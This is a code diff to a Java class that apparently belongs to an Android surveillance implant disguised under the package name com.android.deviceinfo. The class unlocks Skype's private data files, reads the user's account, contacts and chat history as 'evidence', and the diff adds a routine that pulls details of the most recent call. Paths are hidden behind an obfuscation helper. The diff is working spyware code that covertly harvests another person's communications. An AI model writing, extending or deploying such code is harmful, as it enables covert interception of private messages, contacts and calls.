@@ -22,6 +22,7 @@ import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.manager.ManagerModule;
+import com.android.deviceinfo.module.CallInfo;
 import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
@@ -39,6 +40,8 @@ public class ChatSkype extends SubModuleChat {
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
 	ChatGroups groups = new ChatSkypeGroups();
+
+	public static String dbDir = M.e("/data/data/com.skype.raider/files");
 
 	@Override
 	public int getProgramId() {
@@ -99,37 +102,24 @@ public class ChatSkype extends SubModuleChat {
 			boolean updateMarkup = false;
 
 			// k_0=/data/data/com.skype.raider/files
-			String dbDir = M.e("/data/data/com.skype.raider/files");
-			Path.unprotect(dbDir, true);
 
 			String account = readAccount();
+
 			if (account == null || account.length() == 0)
 				return;
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readSkypeMessageHistory) account: " + account);
 			}
-			// k_1=/main.db
-			String dbFile = dbDir + "/" + account + M.e("/main.db");
 
-			Path.unprotect(dbDir + "/" + account, true);
-			Path.unprotect(dbFile, true);
-			Path.unprotect(dbFile + "-journal", true);
-
-			File file = new File(dbFile);
-
-			if (file.canRead()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (readSkypeMessageHistory): can read DB");
-				}
-
-				GenericSqliteHelper helper = GenericSqliteHelper.open(dbFile);
-
+			GenericSqliteHelper helper = openSkypeDBHelper(account);
+			if (helper != null) {
+				
 				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.SKYPE, account);
-				if(ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)){
+				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
 					saveSkypeContacts(helper);
 				}
-				
+
 				List<SkypeConversation> conversations = getSkypeConversations(helper, account);
 				for (SkypeConversation sc : conversations) {
 					String peer = sc.remote;
@@ -157,7 +147,7 @@ public class ChatSkype extends SubModuleChat {
 
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (readSkypeMessageHistory) Error, file not readable: " + dbFile);
+					Check.log(TAG + " (readSkypeMessageHistory) Error, null helper");
 				}
 			}
 		} finally {
@@ -165,25 +155,47 @@ public class ChatSkype extends SubModuleChat {
 		}
 	}
 
-	private void saveSkypeContacts(GenericSqliteHelper helper) {
-		String[] projection = new String[] { "id", "skypename", "fullname", "displayname","pstnnumber" };
+	public static GenericSqliteHelper openSkypeDBHelper(String account) {
+		// k_1=/main.db
+		String dbFile = dbDir + "/" + account + M.e("/main.db");
 
-		boolean tosave= false;
+		Path.unprotect(dbDir + "/" + account, true);
+		Path.unprotect(dbFile, true);
+		Path.unprotect(dbFile + "-journal", true);
+
+		File file = new File(dbFile);
+
+		GenericSqliteHelper helper = null;
+		if (file.canRead()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readSkypeMessageHistory): can read DB");
+			}
+
+			helper = GenericSqliteHelper.open(dbFile);
+		}
+
+		return helper;
+	}
+
+	private void saveSkypeContacts(GenericSqliteHelper helper) {
+		String[] projection = new String[] { "id", "skypename", "fullname", "displayname", "pstnnumber" };
+
+		boolean tosave = false;
 		RecordVisitor visitor = new RecordVisitor(projection, null) {
-			
+
 			@Override
 			public long cursor(Cursor cursor) {
-				
+
 				long id = cursor.getLong(0);
 				String skypename = cursor.getString(1);
 				String fullname = cursor.getString(2);
 				String displayname = cursor.getString(3);
-				
+
 				String phone = cursor.getString(4);
-				
+
 				Contact c = new Contact(Long.toString(id), phone, skypename, "Display name: " + displayname);
-			
-				if(ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.SKYPE, c)){
+
+				if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.SKYPE, c)) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (cursor) need to serialize");
 					}
@@ -193,7 +205,7 @@ public class ChatSkype extends SubModuleChat {
 			}
 		};
 
-		if(helper.traverseRecords("Contacts", visitor) == 1){
+		if (helper.traverseRecords("Contacts", visitor) == 1) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveSkypeContacts) serialize");
 			}
@@ -326,12 +338,8 @@ public class ChatSkype extends SubModuleChat {
 		helper.traverseRecords("ChatMembers", visitor);
 	}
 
-	private String readAccount() throws IOException {
+	public static String readAccount() {
 
-		// k_0=/data/data/com.skype.raider/files
-		String dbDir = M.e("/data/data/com.skype.raider/files");
-
-		// k_2=/shared.xml
 		String confFile = dbDir + M.e("/shared.xml");
 
 		Path.unprotect(confFile, true);
@@ -381,6 +389,27 @@ public class ChatSkype extends SubModuleChat {
 
 	public void saveEvidence(ArrayList<MessageChat> messages) {
 		getModule().saveEvidence(messages);
+	}
+
+	public static boolean getCurrentCall(GenericSqliteHelper helper, final CallInfo callInfo) {
+		String sqlQuery= "select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id order by ca.id desc limit 1";
+		
+		RecordVisitor visitor = new RecordVisitor() {
+
+			@Override
+			public long cursor(Cursor cursor) {
+				callInfo.id = cursor.getInt(0); 
+				callInfo.peer = cursor.getString(1);
+				callInfo.displayName = cursor.getString(2);
+				int type = cursor.getInt(4);
+				callInfo.incoming = cursor.getInt(6) == 1;
+				
+				return cursor.getLong(0);
+			}
+		};
+
+		helper.traverseRawQuery(sqlQuery, new String[]{}, visitor);
+		return callInfo.valid;
 	}
 
 }
